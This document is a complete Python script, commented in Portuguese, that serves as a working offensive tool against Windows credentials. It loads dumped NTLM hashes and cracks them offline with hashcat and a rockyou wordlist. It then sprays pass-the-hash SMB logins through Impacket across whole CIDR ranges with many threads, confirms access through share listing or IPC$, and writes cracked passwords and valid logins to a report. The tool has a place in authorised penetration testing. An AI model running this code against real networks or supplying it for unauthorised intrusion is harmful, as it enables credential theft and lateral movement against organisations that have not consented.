#!/usr/bin/env python3

import subprocess
import sys
import os
import tempfile
import ipaddress
import shutil
import re
import time
import json
import csv
from argparse import ArgumentParser
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Event
from datetime import datetime

# Import do Impacket
try:
    from impacket.smbconnection import SMBConnection, SessionError
    from impacket import smbconnection
except ImportError:
    print("[ERRO] Impacket não instalado. Execute: pip install impacket")
    sys.exit(1)

# Expressão regular para validar hash NTLM
HASH_REGEX = re.compile(r'^[a-fA-F0-9]{32}$')

# ------------------------------------------------------------
# 1. Função para ler o arquivo de hashes
# ------------------------------------------------------------
def parse_hashes(filename):
    hashes = []
    domain_map = {}

    with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            parts = line.split(':')
            if len(parts) >= 4:
                raw_user = parts[0]
                nt_hash = parts[3].lower()
            elif len(parts) == 2:
                raw_user, nt_hash = parts[0], parts[1].lower()
            else:
                continue

            if not HASH_REGEX.fullmatch(nt_hash):
                continue

            if nt_hash == '31d6cfe0d16ae931b73c59d7e0c089c0':
                continue

            user = raw_user
            domain = ''
            if '\\' in raw_user:
                domain, user = raw_user.split('\\', 1)
            elif '/' in raw_user:
                domain, user = raw_user.split('/', 1)

            hashes.append((user, nt_hash))
            if domain:
                domain_map[user] = domain

    return hashes, domain_map

# ------------------------------------------------------------
# 2. Função para quebrar hashes com Hashcat
# ------------------------------------------------------------
def crack_hashes(hashes, wordlist='rockyou.txt', verbose=False,
                 hashcat_path='hashcat', extra_args=''):
    if not shutil.which(hashcat_path):
        raise FileNotFoundError(f"Executável '{hashcat_path}' não encontrado.")

    hash_to_user = {nt_hash: user for user, nt_hash in hashes}

    with tempfile.NamedTemporaryFile(mode='w+', suffix='.hash', delete=False) as hash_file:
        for user, nt_hash in hashes:
            hash_file.write(f'{nt_hash}\n')
        hash_tmp = hash_file.name

    with tempfile.NamedTemporaryFile(mode='w+', suffix='.out', delete=False) as out_file:
        out_tmp = out_file.name

    try:
        print(f"[*] Executando hashcat com wordlist: {wordlist}")
        cmd = [
            hashcat_path, '-m', '1000', '-a', '0',
            hash_tmp, wordlist,
            '--outfile', out_tmp,
            '--potfile-disable'
        ]
        if extra_args:
            cmd.extend(extra_args.split())

        if verbose:
            cmd.extend(['--status', '--status-timer', '10'])
            result = subprocess.run(cmd)
        else:
            result = subprocess.run(cmd, stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL)

        if result.returncode != 0:
            print(f"[AVISO] Hashcat retornou código {result.returncode}. "
                  "Verifique se a wordlist existe e é acessível.")

        results = {}
        if os.path.exists(out_tmp):
            with open(out_tmp, 'r') as f:
                for line in f:
                    parts = line.strip().split(':')
                    if len(parts) == 2:
                        hash_val, password = parts
                        user = hash_to_user.get(hash_val)
                        if user:
                            results[user] = password
    finally:
        for f in [hash_tmp, out_tmp]:
            if os.path.exists(f):
                os.remove(f)

    return results

# ------------------------------------------------------------
# 3. Função para testar um único hash via SMB (com validação dupla)
# ------------------------------------------------------------
def test_smb_pth(ip, user, nt_hash, domain='', timeout=5, debug=False):
    """
    Tenta autenticar via SMB usando pass-the-hash.
    VALIDAÇÃO DUPLA: 
    1. Tenta listar compartilhamentos
    2. Se falhar, tenta acessar IPC$ diretamente
    Retorna True apenas se confirmar autenticação.
    """
    for attempt in range(2):
        try:
            conn = SMBConnection(ip, ip, timeout=timeout)
            conn.login(user, '', domain,
                       lmhash='aad3b435b51404eeaad3b435b51404ee',
                       nthash=nt_hash)
            
            # VALIDAÇÃO 1: Tenta listar compartilhamentos
            try:
                shares = conn.listShares()
                if debug:
                    print(f"[DEBUG] listShares successful for {user}@{ip}")
                return True
            except Exception as e1:
                if debug:
                    print(f"[DEBUG] listShares failed for {user}@{ip}: {e1}")
                
                # VALIDAÇÃO 2: Tenta acessar IPC$ diretamente
                try:
                    conn.connectTree('IPC$')
                    if debug:
                        print(f"[DEBUG] IPC$ access successful for {user}@{ip}")
                    return True
                except Exception as e2:
                    if debug:
                        print(f"[DEBUG] IPC$ access failed for {user}@{ip}: {e2}")
                    return False
                
        except SessionError as e:
            if debug:
                print(f"[DEBUG] Auth failed for {user}@{ip}: {e}")
            return False
        except (ConnectionRefusedError, TimeoutError, OSError) as e:
            if attempt == 0:
                if debug:
                    print(f"[DEBUG] Network error for {user}@{ip}, retrying... ({e})")
                time.sleep(0.5)
                continue
            else:
                if debug:
                    print(f"[DEBUG] Network error for {user}@{ip} after retry: {e}")
                raise
        except Exception as e:
            if debug:
                print(f"[DEBUG] Unexpected error for {user}@{ip}: {e}")
            raise
    return False

# ------------------------------------------------------------
# 4. Função para carregar alvos com suporte a CIDR
# ------------------------------------------------------------
def load_targets(targets_file, verbose=False):
    """
    Carrega alvos de um arquivo, suportando IPs únicos e notação CIDR.
    Retorna uma lista de IPs únicos e ordenados.
    """
    if not os.path.exists(targets_file):
        raise FileNotFoundError(f"Arquivo {targets_file} não encontrado.")
    
    targets = set()
    total_expanded = 0
    
    with open(targets_file, 'r') as f:
        for line_num, line in enumerate(f, 1):
            line = line.strip()
            if not line or line.startswith('#'):  # Suporte a comentários
                continue
            
            try:
                if '/' in line:
                    # Rede CIDR
                    network = ipaddress.ip_network(line, strict=False)
                    new_ips = [str(ip) for ip in network.hosts()]
                    targets.update(new_ips)
                    total_expanded += len(new_ips)
                    if verbose:
                        print(f"[*] Expandido {line} -> {len(new_ips)} IPs")
                else:
                    # IP único
                    ipaddress.ip_address(line)
                    targets.add(line)
                    if verbose:
                        print(f"[*] Adicionado IP: {line}")
            except ValueError as e:
                print(f"[AVISO] Linha {line_num} ignorada: '{line}' - {e}")
    
    if not targets:
        raise ValueError("Nenhum IP válido encontrado no arquivo.")
    
    targets_sorted = sorted(targets)
    print(f"[*] Total: {len(targets_sorted)} IPs únicos carregados.")
    return targets_sorted

# ------------------------------------------------------------
# 5. Função para testar todos os hashes (concorrente)
# ------------------------------------------------------------
def test_all_hashes(hashes, target_ips, domain_map, domain='',
                    max_workers=20, timeout=5, debug=False):
    valid = {}
    total_combinations = len(hashes) * len(target_ips)
    completed = 0

    print(f"[*] Testando {len(hashes)} usuários contra {len(target_ips)} alvos "
          f"com até {max_workers} threads simultâneas...")

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        for user, nt_hash in hashes:
            user_domain = domain if domain else domain_map.get(user, '')

            stop_event = Event()
            futures = {}

            for ip in target_ips:
                future = executor.submit(
                    test_smb_pth_wrapper, ip, user, nt_hash,
                    user_domain, timeout, stop_event, debug
                )
                futures[future] = ip

            for future in as_completed(futures):
                ip = futures[future]
                completed += 1
                try:
                    result = future.result()
                except Exception:
                    continue
                else:
                    if result is True:
                        print(f"\n[+] SUCESSO! {user}@{ip} autenticou com o hash {nt_hash}")
                        valid[(user, ip)] = nt_hash
                        stop_event.set()
                        break

                if completed % 10 == 0 or completed == total_combinations:
                    print(f"[*] Progresso: {completed}/{total_combinations} combinações testadas", end='\r')

    print("\n[*] Testes online concluídos.")
    return valid

def test_smb_pth_wrapper(ip, user, nt_hash, domain, timeout, stop_event, debug):
    if stop_event.is_set():
        return False
    try:
        return test_smb_pth(ip, user, nt_hash, domain, timeout, debug)
    except Exception:
        return False

# ------------------------------------------------------------
# 6. Função para salvar resultados
# ------------------------------------------------------------
def save_results(output_file, cracked, valid_creds, args, output_format='txt'):
    data = {
        "metadata": {
            "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            "hashfile": args.hashfile,
            "crack_attempted": args.crack,
            "wordlist": args.wordlist if args.crack else None,
            "targets_file": args.targets,
            "domain": args.domain or None,
            "threads": getattr(args, 'threads', None),
            "timeout": getattr(args, 'timeout', None)
        },
        "cracked_passwords": cracked,
        "valid_pass_the_hash": [f"{user}@{ip} -> {hash_}" for (user, ip), hash_ in valid_creds.items()]
    }

    with open(output_file, 'w', encoding='utf-8') as f:
        if output_format == 'json':
            json.dump(data, f, indent=2, ensure_ascii=False)
        elif output_format == 'csv':
            writer = csv.writer(f)
            writer.writerow(['Tipo', 'Usuario', 'IP/Hash', 'Valor'])
            writer.writerow(['metadata', 'timestamp', data['metadata']['timestamp']])
            for user, pwd in cracked.items():
                writer.writerow(['cracked', user, 'senha', pwd])
            for entry in data['valid_pass_the_hash']:
                parts = entry.split(' -> ')
                user_ip = parts[0]
                hash_val = parts[1]
                user, ip = user_ip.split('@')
                writer.writerow(['pass_the_hash', user, ip, hash_val])
        else:
            f.write(f"=== RELATÓRIO DE TESTE DE HASHES NTLM ===\n")
            f.write(f"Data/Hora: {data['metadata']['timestamp']}\n")
            f.write(f"Arquivo de hashes: {args.hashfile}\n")
            if args.crack:
                f.write(f"Wordlist usada: {args.wordlist}\n")
            if args.targets:
                f.write(f"Arquivo de alvos: {args.targets}\n")
                f.write(f"Domínio: {args.domain or '(extraído automaticamente)'}\n")
                f.write(f"Threads: {args.threads}\n")
                f.write(f"Timeout: {args.timeout}s\n")
            f.write("-" * 50 + "\n\n")

            if cracked:
                f.write("[+] SENHAS QUEBRADAS (offline):\n")
                for user, pwd in cracked.items():
                    f.write(f"    {user} : {pwd}\n")
                f.write("\n")
            else:
                f.write("[-] Nenhuma senha foi quebrada.\n\n")

            if valid_creds:
                f.write("[+] CREDENCIAIS VÁLIDAS (pass-the-hash):\n")
                for (user, ip), nt_hash in valid_creds.items():
                    f.write(f"    {user}@{ip} -> {nt_hash}\n")
                f.write("\n")
            else:
                f.write("[-] Nenhuma credencial válida encontrada via pass-the-hash.\n")

            f.write("=" * 50 + "\n")
            f.write("Fim do relatório.\n")

    os.chmod(output_file, 0o600)

# ------------------------------------------------------------
# 7. MAIN
# ------------------------------------------------------------
def main():
    parser = ArgumentParser(
        description='Ferramenta de teste de hashes NTLM (offline/online) com concorrência'
    )
    parser.add_argument('hashfile', help='Arquivo com hashes (formato SAM ou user:hash)')
    parser.add_argument('--crack', action='store_true', help='Tenta quebrar os hashes com hashcat')
    parser.add_argument('--wordlist', default='rockyou.txt', help='Caminho para a wordlist (padrão: rockyou.txt)')
    parser.add_argument('--hashcat-path', default='hashcat', help='Caminho para o executável do hashcat (padrão: hashcat)')
    parser.add_argument('--hashcat-args', default='', help='Argumentos extras para passar ao hashcat (ex: "-O -w 3")')
    parser.add_argument('--targets', help='Arquivo com lista de IPs alvo para testar pass-the-hash')
    parser.add_argument('--domain', default='', help='Domínio do usuário (opcional, ex: dominio.local). Sobrescreve extração automática.')
    parser.add_argument('--threads', type=int, default=20, help='Número máximo de threads simultâneas (padrão: 20)')
    parser.add_argument('--timeout', type=int, default=5, help='Timeout em segundos para cada conexão SMB (padrão: 5)')
    parser.add_argument('--verbose', action='store_true', help='Exibe saída detalhada (inclusive do hashcat)')
    parser.add_argument('--debug', action='store_true', help='Exibe exceções detalhadas durante os testes SMB')
    parser.add_argument('--output', default='resultados.txt', help='Arquivo de saída (padrão: resultados.txt)')
    parser.add_argument('--format', choices=['txt', 'json', 'csv'], default='txt',
                        help='Formato do relatório de saída (padrão: txt)')
    parser.add_argument('--force', action='store_true', help='Sobrescreve arquivo de saída existente sem aviso')
    args = parser.parse_args()

    if not os.path.exists(args.hashfile):
        print(f"[ERRO] Arquivo {args.hashfile} não encontrado.")
        sys.exit(1)

    hashes, domain_map = parse_hashes(args.hashfile)
    if not hashes:
        print("[ERRO] Nenhum hash válido encontrado no arquivo.")
        sys.exit(1)
    print(f"[*] {len(hashes)} hashes válidos carregados.")
    if domain_map:
        print(f"[*] Domínios extraídos automaticamente: {', '.join(set(domain_map.values()))}")

    if os.path.exists(args.output) and not args.force:
        base, ext = os.path.splitext(args.output)
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        new_output = f"{base}_{timestamp}{ext}"
        print(f"[AVISO] Arquivo '{args.output}' já existe. Salvando como '{new_output}'.")
        args.output = new_output

    cracked = {}
    valid_creds = {}

    if args.crack:
        if not os.path.exists(args.wordlist):
            print(f"[AVISO] Wordlist '{args.wordlist}' não encontrada. Pulando cracking.")
        else:
            try:
                cracked = crack_hashes(
                    hashes, args.wordlist, args.verbose,
                    args.hashcat_path, args.hashcat_args
                )
                if cracked:
                    print("\n[+] Senhas quebradas:")
                    for user, pwd in cracked.items():
                        print(f"    {user} : {pwd}")
                else:
                    print("\n[-] Nenhuma senha foi quebrada com essa wordlist.")
            except FileNotFoundError as e:
                print(f"[ERRO] {e}")
                sys.exit(1)

    if args.targets:
        try:
            targets = load_targets(args.targets, verbose=args.verbose)
        except (FileNotFoundError, ValueError) as e:
            print(f"[ERRO] {e}")
            sys.exit(1)

        valid_creds = test_all_hashes(
            hashes, targets, domain_map,
            domain=args.domain,
            max_workers=args.threads,
            timeout=args.timeout,
            debug=args.debug
        )
        if valid_creds:
            print("\n[+] Hashes válidos encontrados (pass-the-hash funcionou):")
            for (user, ip), nt_hash in valid_creds.items():
                print(f"    {user}@{ip} -> {nt_hash}")
        else:
            print("\n[-] Nenhum hash funcionou contra os alvos fornecidos.")

    if not args.crack and not args.targets:
        print("[AVISO] Nenhuma ação solicitada. Use --crack ou --targets.")
        return

    if args.crack or args.targets:
        save_results(args.output, cracked, valid_creds, args, args.format)
        print(f"\n[*] Resultados salvos em: {args.output} (permissões 600)")

if __name__ == '__main__':
    main()
